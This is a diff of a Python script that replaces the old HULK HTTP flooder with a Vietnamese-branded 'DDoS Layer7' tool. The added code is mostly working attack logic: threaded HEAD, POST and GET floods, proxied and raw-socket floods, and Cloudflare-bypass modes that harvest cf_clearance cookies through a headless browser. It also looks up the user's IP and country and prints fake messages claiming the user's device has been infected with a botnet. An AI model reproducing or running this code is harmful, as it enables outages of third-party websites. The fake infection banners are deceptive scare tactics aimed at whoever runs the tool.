@@ -23,149 +23,759 @@ print("""\033[93m
                DDoS Layer7 (DDoS) 💥
 """)
 print()
-import urllib2
-import sys
-import threading
-import random
-import re
+from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
+from calendar import weekheader
+from time import sleep
+import requests
+stt=0
+from time import sleep
+import requests
+import os, sys, requests, random
+import time
+from random import choice, randint, shuffle
+try:
+  from pystyle import Center, Anime, Colors, Colorate
+except:
+  os.system('pip install pystyle') 
+  
 
-#global params
-url=''
-host=''
-headers_useragents=[]
-headers_referers=[]
-request_counter=0
-flag=0
-safe=0
+def logo():
+    log="""
+\x1b[38;2;0;255;180m     ══╦══════════════════════════════════════════════════════════════════════╦══
+          ╔══════════════╩═════════════════════════════════╩══════════════╗
+          ║       ________   ________      ______    _______              ║
+          ║      |"      "\ |"      "\    /    " \  /"       )            ║
+          ║      (.  ___  :)(.  ___  :)  // ____  \(:   \___/             ║
+          ║      |: \   ) |||: \   ) || /  /    ) :)\___  \               ║
+          ║      (| (___\ ||(| (___\ ||(: (____/ //  __/  \\               ║
+          ║      |:       :)|:       :) \        /  /" \   :)             ║
+          ║      (________/ (________/   \"_____/  (_______/               ║
+          ║                                        ╔═╗╔═╗╔╦╗╔═╗  ╔╗ ╦ ╦   ║
+          ║                                        ║  ║ ║ ║║║╣   ╠╩╗╚╦╝   ║
+          ║                                        ╚═╝╚═╝═╩╝╚═╝  ╚═╝ ╩    ║
+          ║       ___________       ______       ___      ___             ║
+          ║      ("     _   ")     /" _  "\     |"  \    /"  |            ║
+          ║       )__/  \\__/     (: ( \___)     \   \  //    |            ║
+          ║          \\_ /         \/ \          /\\  \/.      |            ║
+          ║          |.  |         //  \ _      |: \.        |            ║
+          ║          \:  |        (:   _) \     |.  \    /:  |            ║
+          ║           \__|         \_______)    |___|\__/|___|            ║
+          ║                                                               ║
+          ╚═══════════════════════════════════════════════════════════════╝               
+"""
+    for h in log:
+       sys.stdout.write(h)
+       sys.stdout.flush()
+       sleep(0)
+       
+       
+def clr():
+  if os.name == "nt":
+    os.system("cls")
+  else:
+    os.system('clear') 
 
-def inc_counter():
-	global request_counter
-	request_counter+=1
+clr()
+logo()
 
-def set_flag(val):
-	global flag
-	flag=val
+   # Tạo Nút Tạo Cảm Giác Gần Gũi Vui Vẻ Hơn Với Người dùng tool  
+   #dùng giao diên basic sẽ dễ nhìn mà chuyên nghiệp hơn
+print('\x1b[38;2;256;0;10m               ╔══════════════════════════════════════════════════════╗')
+print('\x1b[38;2;256;0;10m               ║ \x1b[38;2;0;255;189m       h   ╔═══> Copyright: Trần Công Minh\x1b[38;2;256;0;10m            ║')
+ip = requests.get('https://api.ipify.org').text.strip()
+loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].lower()
+print('\x1b[38;2;256;0;10m               ║            \x1b[38;2;256;0;10m                                          ║   ')
+print('\x1b[38;2;256;0;10m               ║\x1b[38;2;0;255;189m           ╔═══>  IP của bạn:'+ip) 
+print('\x1b[38;2;256;0;10m               ║            \x1b[38;2;256;0;10m                                          ║   ')
+print('\x1b[38;2;256;0;10m               ║ \x1b[38;2;0;255;189m          ╔═══>  Nhập [help] Để Vào Tool\x1b[38;2;256;0;10m             ║')
+print('\x1b[38;2;256;0;10m               ╚══════════════════════════════════════════════════════╝')
+input('\x1b[\x1b[38;2;0;255;189m ╔═══> @TCM: ')
+input('\x1b[\x1b[38;2;0;255;189m ╔═══> @TCM: Xác Nhận Y/n: ')
+print('\x1b[\x1b[38;2;0;255;189m ╔═══> @TCM: Xác Nhận Thành Công Vui Lòng Đợi 5s ')
+sleep(5)
+Write.Print('===================================================='+'\n',Colors.red_to_yellow,interval=0.03)
+Write.Print('╔═══> @TCM: Thành Công'+'\n',Colors.white_to_red,interval=0.03)
+Write.Print('╔═══> @TCM: Đã Cài = Botnet'+'\n',Colors.white_to_red,interval=0.03)
+Write.Print('╔═══> @TCM: Phiên Bản = V2'+'\n',Colors.white_to_red,interval=0.03)
+Write.Print('╔═══> @TCM: Trạng Thái = Start'+'\n',Colors.white_to_red,interval=0.03)
+Write.Print('===================================================='+'\n',Colors.red_to_yellow,interval=0.03)
+Write.Print('╔═══> @TCM: Thiết Bị Cặc Lỏ Của Bạn Đã Dính Botnet'+'\n',Colors.white_to_red,interval=0.03)
+Write.Print('╔═══> @TCM: Đã Cài Thành Công'+'\n',Colors.white_to_red,interval=0.03)
+Write.Print('╔═══> @TCM: BẮt Đầu'+'\n',Colors.white_to_red,interval=0.03)
+Write.Print('===================================================='+'\n',Colors.red_to_yellow,interval=0.03)
+Write.Print('╔═══> @TCM: Check-cam hacker..'+'\n',Colors.white_to_red,interval=0.03)
 
-def set_safe():
-	global safe
-	safe=1
-	
-# generates a user agent array
-def useragent_list():
-	global headers_useragents
-	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
-	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
-	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
-	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
-	return(headers_useragents)
+Write.Print('╔═══> @TCM: Check-date mobile..'+'\n',Colors.white_to_red,interval=0.03)
 
-# generates a referer array
-def referer_list():
-	global headers_referers
-	headers_referers.append('http://www.google.com/?q=')
-	headers_referers.append('http://www.usatoday.com/search/results?q=')
-	headers_referers.append('http://engadget.search.aol.com/search?q=')
-	headers_referers.append('http://' + host + '/')
-	return(headers_referers)
-	
-#builds random ascii string
-def buildblock(size):
-	out_str = ''
-	for i in range(0, size):
-		a = random.randint(65, 90)
-		out_str += chr(a)
-	return(out_str)
+Write.Print('╔═══> @TCM: inport date get telegram..'+'\n',Colors.white_to_red,interval=0.03)
 
-def usage():
-	print('---------------------------------------------------')
-	print('USAGE: python hulk.py <url>')
-	print('you can add "safe" after url, to autoshut after dos')
-	print('---------------------------------------------------')
+Write.Print('╔═══> @TCM: Done..'+'\n',Colors.white_to_red,interval=0.03)
 
-	
-#http request
-def httpcall(url):
-	useragent_list()
-	referer_list()
-	code=0
-	if url.count("?")>0:
-		param_joiner="&"
-	else:
-		param_joiner="?"
-	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
-	request.add_header('User-Agent', random.choice(headers_useragents))
-	request.add_header('Cache-Control', 'no-cache')
-	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
-	request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
-	request.add_header('Keep-Alive', random.randint(110,120))
-	request.add_header('Connection', 'keep-alive')
-	request.add_header('Host',host)
-	try:
-			urllib2.urlopen(request)
-	except urllib2.HTTPError, e:
-			#print e.code
-			set_flag(1)
-			print('Response Code 500')
-			code=500
-	except urllib2.URLError, e:
-			#print e.reason
-			sys.exit()
-	else:
-			inc_counter()
-			urllib2.urlopen(request)
-	return(code)		
+Write.Print('===================================================='+'\n',Colors.red_to_yellow,interval=0.03)
 
-	
-#http caller thread 
-class HTTPThread(threading.Thread):
-	def run(self):
-		try:
-			while flag<2:
-				code=httpcall(url)
-				if (code==500) & (safe==1):
-					set_flag(2)
-		except Exception, ex:
-			pass
+def logo():
+  
+    log="""
+\x1b[38;2;0;255;190m                    ███╗░░██╗░██████╗░██╗░░░██╗  ██╗░░░██╗░█████╗░██╗░░░░░
+                    ████╗░██║██╔════╝░██║░░░██║  ██║░░░██║██╔══██╗██║░░��░░
+                    ██╔██╗██║██║░░██╗░██║░░░██║  ╚██╗░██╔╝██║░░╚═╝██║░░░░░
+                    ██║╚████║██║░░╚██╗██║░░░██║  ░╚████╔╝░██║░░██╗██║░░░░░
+                    ██║░╚███║╚██████╔╝╚██████╔╝  ░░╚██╔╝░░╚█████╔╝███████╗
+                    ╚═╝░░╚══╝░╚═════╝░░╚═════╝░  ░░░╚═╝░░░░╚════╝░╚══════╝
+                                 """
+    for h in log:
+       sys.stdout.write(h)
+       sys.stdout.flush()
+       sleep(0)
+       
+       
+def clr():
+  if os.name == "nt":
+    os.system("cls")
+  else:
+    os.system('clear') 
 
-# monitors http threads and counts requests
-class MonitorThread(threading.Thread):
-	def run(self):
-		previous=request_counter
-		while flag==0:
-			if (previous+100<request_counter) & (previous<>request_counter):
-				print("%d Requests Sent") % (request_counter)
-				previous=request_counter
-		if flag==2:
-			print("\n-- HULK Attack Finished --")
+clr()
+logo()
+Write.Print('   Trạng Thái = Done.. '+'\n',Colors.white_to_red,interval=0.03)
+Write.Print('======================================================================================================='+'\n',Colors.red_to_yellow,interval=0.03)
+Write.Print('╔═══> @TCM: Key Của Mày: KgtH2-UiYTg-TohS-RaHs '+'\n',Colors.white_to_red,interval=0.03)
+Write.Print('╔═══> @TCM: Liên Hệ Facebook: https://www.facebook.com/profile.php?id=100008095299935  '+'\n',Colors.white_to_red,interval=0.03)
+Write.Print('╔═══> @TCM: Ib Anh Xóa Bot Cho  '+'\n',Colors.white_to_red,interval=0.03)
+Write.Print('======================================================================================================='+'\n',Colors.red_to_yellow,interval=0.03)
+Write.Print('                               ╔═══> Trần Công Minh DEPTRY <═══╗'+'\n',Colors.red_to_blue,interval=0.03) 
+Write.Print('                               ╔═══> Đang Khởi Chạy......  <═══╗'+'\n',Colors.red_to_blue,interval=0.03)
+sleep(10)
+# -*- coding: utf-8 -*-
+from os import system, name
+import os, threading, requests, cloudscraper, datetime, time, socket, socks, ssl, random
+from urllib.parse import urlparse
+from requests.cookies import RequestsCookieJar
+import undetected_chromedriver as webdriver
+from sys import stdout
+from colorama import Fore, init
+init(convert=True)
 
-#execute 
-if len(sys.argv) < 2:
-	usage()
-	sys.exit()
-else:
-	if sys.argv[1]=="help":
-		usage()
-		sys.exit()
-	else:
-		print("-- HULK Attack Started --")
-		if len(sys.argv)== 3:
-			if sys.argv[2]=="safe":
-				set_safe()
-		url = sys.argv[1]
-		if url.count("/")==2:
-			url = url + "/"
-		m = re.search('(https?\://)?([^/]*)/?.*', url)
-		host = m.group(2)
-		for i in range(500):
-			t = HTTPThread()
-			t.start()
-		t = MonitorThread()
-		t.start()
+def countdown(t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    while True:
+        if (until - datetime.datetime.now()).total_seconds() > 0:
+            stdout.flush()
+            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
+        else:
+            stdout.flush()
+            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                   \n")
+            return
+
+#region get
+def get_target(url):
+    url = url.rstrip()
+    target = {}
+    target['uri'] = urlparse(url).path
+    if target['uri'] == "":
+        target['uri'] = "/"
+    target['host'] = urlparse(url).netloc
+    target['scheme'] = urlparse(url).scheme
+    if ":" in urlparse(url).netloc:
+        target['port'] = urlparse(url).netloc.split(":")[1]
+    else:
+        target['port'] = "443" if urlparse(url).scheme == "https" else "80"
+        pass
+    return target
+
+def get_proxies():
+    global proxies
+    if not os.path.exists("./proxy.txt"):
+        stdout.write(Fore.MAGENTA+" [*]"+Fore.WHITE+" You Need Proxy File ( ./proxy.txt )\n")
+        return False
+    proxies = open("./proxy.txt", 'r').read().split('\n')
+    return True
+
+def get_cookie(url):
+    global useragent, cookieJAR, cookie
+    options = webdriver.ChromeOptions()
+    arguments = [
+    '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
+    '--disable-notifications', '--disable-gpu', '--headless', '--lang=ko_KR', '--start-maxmized',
+    '--user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en' 
+    ]
+    for argument in arguments:
+        options.add_argument(argument)
+    driver = webdriver.Chrome(options=options)
+    driver.implicitly_wait(3)
+    driver.get(url)
+    for _ in range(60):
+        cookies = driver.get_cookies()
+        tryy = 0
+        for i in cookies:
+            if i['name'] == 'cf_clearance':
+                cookieJAR = driver.get_cookies()[tryy]
+                useragent = driver.execute_script("return navigator.userAgent")
+                cookie = f"{cookieJAR['name']}={cookieJAR['value']}"
+                driver.quit()
+                return True
+            else:
+                tryy += 1
+                pass
+        time.sleep(1)
+    driver.quit()
+    return False
+
+def get_info():
+    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     "+Fore.RED+": "+Fore.LIGHTGREEN_EX)
+    target = input()
+    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  "+Fore.RED+": "+Fore.LIGHTGREEN_EX)
+    thread = input()
+    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) "+Fore.RED+": "+Fore.LIGHTGREEN_EX)
+    t = input()
+    return target, thread, t
+#endregion
+
+#region METHOD
+
+#region HEAD
+def LaunchHEAD(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackHEAD, args=(url, until))
+            thd.start()
+        except:
+            pass
+
+def AttackHEAD(url, until_datetime):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            requests.head(url)
+            requests.head(url)
+        except:
+            pass
+#endregion
+
+#region POST
+def LaunchPOST(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackPOST, args=(url, until))
+            thd.start()
+        except:
+            pass
+
+def AttackPOST(url, until_datetime):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            requests.post(url)
+            requests.post(url)
+        except:
+            pass
+#endregion
+
+#region RAW
+def LaunchRAW(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackRAW, args=(url, until))
+            thd.start()
+        except:
+            pass
+
+def AttackRAW(url, until_datetime):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            requests.get(url)
+            requests.get(url)
+        except:
+            pass
+#endregion
+
+#region PXRAW
+def LaunchPXRAW(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackPXRAW, args=(url, until))
+            thd.start()
+        except:
+            pass
+
+def AttackPXRAW(url, until_datetime):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        proxy = 'http://'+str(random.choice(list(proxies)))
+        proxy = {
+            'http': proxy,   
+            'https': proxy,
+        }
+        try:
+            requests.get(url, proxies=proxy)
+            requests.get(url, proxies=proxy)
+        except:
+            pass
+#endregion
+
+#region PXSOC
+def LaunchPXSOC(url, th, t):
+    target = get_target(url)
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    req =  "GET " +target['uri'] + " HTTP/1.1\r\n"
+    req += "Host: " + target['host'] + "\r\n"
+    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
+    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+    req += "Connection: Keep-Alive\r\n\r\n"
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackPXSOC, args=(target, until, req))
+            thd.start()
+        except:
+            pass
+
+def AttackPXSOC(target, until_datetime, req):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            proxy = random.choice(list(proxies)).split(":")
+            if target['scheme'] == 'https':
+                s = socks.socksocket()
+                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
+                s.connect((str(target['host']), int(target['port'])))
+                s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
+            else:
+                s = socks.socksocket()
+                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
+                s.connect((str(target['host']), int(target['port'])))
+            try:
+                for _ in range(100):
+                    s.send(str.encode(req))
+            except:
+                s.close()
+        except:
+            return
+#endregion
+
+#region SOC
+def LaunchSOC(url, th, t):
+    target = get_target(url)
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    req =  "GET "+target['uri']+" HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
+    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
+    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+    req += "Connection: Keep-Alive\r\n\r\n"
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackSOC, args=(target, until, req))
+            thd.start()
+        except:
+            pass
+
+def AttackSOC(target, until_datetime, req):
+    if target['scheme'] == 'https':
+        s = socks.socksocket()
+        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        s.connect((str(target['host']), int(target['port'])))
+        s = ssl.create_default_context().wrap_socket(s, server_hostname=target['host'])
+    else:
+        s = socks.socksocket()
+        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        s.connect((str(target['host']), int(target['port'])))
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            try:
+                for _ in range(100):
+                    s.send(str.encode(req))
+            except:
+                s.close()
+        except:
+            pass
+#endregion
+
+#region CFB
+def LaunchCFB(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    scraper = cloudscraper.create_scraper()
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
+            thd.start()
+        except:
+            pass
+
+def AttackCFB(url, until_datetime, scraper):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            scraper.get(url, timeout=15)
+            scraper.get(url, timeout=15)
+        except:
+            pass
+#endregion
+
+#region PXCFB
+def LaunchPXCFB(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    scraper = cloudscraper.create_scraper()
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper))
+            thd.start()
+        except:
+            pass
+
+def AttackPXCFB(url, until_datetime, scraper):
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            proxy = {
+                    'http': 'http://'+str(random.choice(list(proxies))),   
+                    'https': 'http://'+str(random.choice(list(proxies))),
+            }
+            scraper.get(url, proxies=proxy)
+            scraper.get(url, proxies=proxy)
+        except:
+            pass
+#endregion
+
+#region CFPRO
+def LaunchCFPRO(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    session = requests.Session()
+    scraper = cloudscraper.create_scraper(sess=session)
+    jar = RequestsCookieJar()
+    jar.set(cookieJAR['name'], cookieJAR['value'])
+    scraper.cookies = jar
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackCFPRO, args=(url, until, scraper))
+            thd.start()
+        except:
+            pass
+
+def AttackCFPRO(url, until_datetime, scraper):
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_3 like Mac OS X) AppleWebKit/603.3.8 (KHTML, like Gecko) Mobile/14G60 MicroMessenger/6.5.18 NetType/WIFI Language/en',
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+        'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
+        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
+        'Cache-Control': 'no-cache',
+        'Pragma': 'no-cache',
+        'Connection': 'keep-alive',
+        'Upgrade-Insecure-Requests': '1',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'same-origin',
+        'Sec-Fetch-User': '?1',
+        'TE': 'trailers',
+    }
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            scraper.get(url=url, headers=headers, allow_redirects=False)
+            scraper.get(url=url, headers=headers, allow_redirects=False)
+        except:
+            pass
+#endregion
+
+#region CFSOC
+def LaunchCFSOC(url, th, t):
+    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
+    target = get_target(url)
+    req =  'GET '+ target['uri'] +' HTTP/1.1\r\n'
+    req += 'Host: ' + target['host'] + '\r\n'
+    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'
+    req += 'Accept-Encoding: gzip, deflate, br\r\n'
+    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
+    req += 'Cache-Control: max-age=0\r\n'
+    req += 'Cookie: ' + cookie + '\r\n'
+    req += f'sec-ch-ua: "Chromium";v="100", "Google Chrome";v="100"\r\n'
+    req += 'sec-ch-ua-mobile: ?0\r\n'
+    req += 'sec-ch-ua-platform: "Windows"\r\n'
+    req += 'sec-fetch-dest: empty\r\n'
+    req += 'sec-fetch-mode: cors\r\n'
+    req += 'sec-fetch-site: same-origin\r\n'
+    req += 'Connection: Keep-Alive\r\n'
+    req += 'User-Agent: ' + useragent + '\r\n\r\n\r\n'
+    for _ in range(int(th)):
+        try:
+            thd = threading.Thread(target=AttackCFSOC,args=(until, target, req,))
+            thd.start()
+        except:  
+            pass
+
+def AttackCFSOC(until_datetime, target, req):
+    if target['scheme'] == 'https':
+        packet = socks.socksocket()
+        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        packet.connect((str(target['host']), int(target['port'])))
+        packet = ssl.create_default_context().wrap_socket(packet, server_hostname=target['host'])
+    else:
+        packet = socks.socksocket()
+        packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+        packet.connect((str(target['host']), int(target['port'])))
+    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+        try:
+            for _ in range(10):
+                packet.send(str.encode(req))
+        except:
+            packet.close()
+            pass
+#endregion
+
+#region testzone
+def attackSKY(url, timer, threads):
+    for i in range(int(threads)):
+        threading.Thread(target=LaunchSKY, args=(url, timer)).start()
+
+def LaunchSKY(url, timer):
+    prox = open("./socks.txt", 'r').read().split('\n')
+    proxy = random.choice(prox).strip().split(":")
+    timelol = time.time() + int(timer)
+    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
+    req += "Cache-Control: no-cache\r\n"
+    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
+    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+    req += "Sec-Fetch-Site: same-origin\r\n"
+    req += "Sec-GPC: 1\r\n"
+    req += "Sec-Fetch-Mode: navigate\r\n"
+    req += "Sec-Fetch-Dest: document\r\n"
+    req += "Upgrade-Insecure-Requests: 1\r\n"
+    req += "Connection: Keep-Alive\r\n\r\n"
+    while time.time() < timelol:
+        try:
+            s = socks.socksocket()
+            s.connect((str(urlparse(url).netloc), int(443)))
+            s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+            ctx = ssl.SSLContext()
+            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
+            s.send(str.encode(req))
+            try:
+                for i in range(100):
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+            except:
+                s.close()
+        except:
+            s.close()
+
+def attackSTELLAR(url, timer, threads):
+    for i in range(int(threads)):
+        threading.Thread(target=LaunchSTELLAR, args=(url, timer)).start()
+
+def LaunchSTELLAR(url, timer):
+    timelol = time.time() + int(timer)
+    req =  "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
+    req += "Cache-Control: no-cache\r\n"
+    req += "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" + "\r\n"
+    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+    req += "Sec-Fetch-Site: same-origin\r\n"
+    req += "Sec-GPC: 1\r\n"
+    req += "Sec-Fetch-Mode: navigate\r\n"
+    req += "Sec-Fetch-Dest: document\r\n"
+    req += "Upgrade-Insecure-Requests: 1\r\n"
+    req += "Connection: Keep-Alive\r\n\r\n"
+    while time.time() < timelol:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((str(urlparse(url).netloc), int(443)))
+            ctx = ssl.SSLContext()
+            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
+            s.send(str.encode(req))
+            try:
+                for i in range(80000):
+                    s.send(str.encode(req))
+                    s.send(str.encode(req))
+            except:
+                s.close()
+        except:
+            s.close()
+#endregion
+
+#endregion
+
+def clear(): 
+    if name == 'nt': 
+        system('cls')
+    else: 
+        system('clear')
+
+def title():
+    #sys.stdout.write("\x1b]2;Karma | User: root\x07")
+    stdout.write("                                                                                          \n")
+    stdout.write("                                 "+Fore.LIGHTBLUE_EX+"╔═╗╔╦╗╔═╗╔═╗╦ ╦╦                 \n")
+    stdout.write("                                 "+Fore.LIGHTMAGENTA_EX    +"║ ║║║║╠═╣║  ╠═╣║                \n")
+    stdout.write("                                 "+Fore.LIGHTRED_EX           +"╚═╝╩ ╩╩ ╩╚═╝╩ ╩╩               \n")
+    stdout.write("             \x1b[38;2;258;0;0m╔═════════╩═════════════════════════════════╩═════════╗")
+    stdout.write("             \x1b[38;2;258;0;0m\n")
+    stdout.write("             \x1b[38;2;255;0;0m║ \x1b[38;2;0;255;180m                  Copyright: @TCM\x1b[38;2;255;0;0m                   ║\n")
+    stdout.write("             \x1b[38;2;255;0;0m║\x1b[38;2;0;255;189m         Welcome To The DDOS ACTTACK Of TCM\x1b[38;2;255;0;0m          ║\n")
+    stdout.write("             \x1b[38;2;255;0;0m║ \x1b[38;2;0;255;189m            Nhập [help] Để Vào Commands    \x1b[38;2;255;0;0m         ║\n")
+    stdout.write("             \x1b[38;2;255;0;0m║ \x1b[38;2;0;255;189m             Liên Hệ - Zalo :339542972   \x1b[38;2;255;0;0m           ║\n")
+    stdout.write("             \x1b[38;2;255;0;0m╚═════════════════════════════════════════════════════╝\n")
+    stdout.write("\n")
+
+def command():
+    stdout.write(Fore.LIGHTMAGENTA_EX+"╔═══"+Fore.LIGHTBLUE_EX+"[""root"+Fore.LIGHTBLUE_EX+" @"+Fore.LIGHTBLUE_EX+"TCM"+Fore.MAGENTA+"]"+Fore.LIGHTMAGENTA_EX+"\n╚══\x1b[38;2;0;255;189m> "+Fore.WHITE)
+    command = input()
+    if command == "cls":
+        clear()
+        title()
+    elif command == "clear":
+        clear()
+        title()
+    elif command == "?":
+        func()
+    elif command == "help":
+        func()
+    elif command == "exit":
+        exit()
+    elif command == "credit":
+        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"Developer          "+Fore.RED+": \x1b[38;2;0;255;189mMINH\n")
+        stdout.write(Fore.MAGENTA+" [*] "+Fore.WHITE+"UI Design          "+Fore.RED+": \x1b[38;2;0;255;189mTCM\n")
